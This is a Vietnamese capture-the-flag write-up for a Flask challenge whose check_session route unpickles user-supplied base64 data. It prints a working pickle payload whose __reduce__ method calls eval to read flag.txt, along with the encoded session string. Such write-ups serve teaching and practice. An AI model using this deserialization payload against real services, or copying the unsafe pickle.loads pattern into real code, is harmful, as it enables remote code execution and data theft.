## Challenge: web-deserialize-python
### Information
Đây là một dịch vụ có triển khai Session Login (Đăng nhập phiên).
Hãy giành lấy flag bằng cách sử dụng lỗ hổng Deserialize (Giải tuần tự hóa) của Python(pickle). Flag nằm trong file flag.txt hoặc biến FLAG.
### Solution
Ta được cung cấp file `app.py` với code Python như sau:
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, redirect
import os, pickle, base64

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

INFO = ['name', 'userid', 'password']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create_session', methods=['GET', 'POST'])
def create_session():
    if request.method == 'GET':
        return render_template('create_session.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        data = base64.b64encode(pickle.dumps(info)).decode('utf8')
        return render_template('create_session.html', data=data)

@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)

app.run(host='0.0.0.0', port=8000)
```

Ta thấy có 2 chức năng chính trên trang web:
- /create_session: cho phép nhập "name", "userid", "password" và dùng `pickle.dumps` để đóng gói dữ liệu lại, mã hóa Base64 sau đó trả về một chuỗi session an toàn.
  <img src="https://github.com/user-attachments/files/23550029/1.md" width="900">
  
- /check_session: lấy chuỗi Base64, giải mã và dùng `pickle.loads()` để mở gói. Đây là điểm yếu vì sẽ thực thi một cách mù quáng bất kỳ lệnh nào có bên trong dữ liệu pickle.
  <img src="https://github.com/user-attachments/files/23550060/2.md" width="900">

Dùng `eval` để giải quyết bài toán này
```python
import pickle
import base64
import os


class FLAG:
    def __reduce__(self):
        cmd = "open('./flag.txt', 'r').read()"
        return (eval, (cmd,))

test = {'name': FLAG()}
print(base64.b64encode(pickle.dumps(test)).decode('utf8'))
```

Lưu file với tên `solver.py` và dùng cmd để chạy ta nhận được một chuỗi Base64:  
`gASVRAAAAAAAAAB9lIwEbmFtZZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIweb3BlbignLi9mbGFnLnR4dCcsICdyJykucmVhZCgplIWUUpRzLg==`

Bỏ chuỗi vào **Check session** và ta có được flag  
<img src="https://github.com/user-attachments/files/23550229/3.md" width="700">
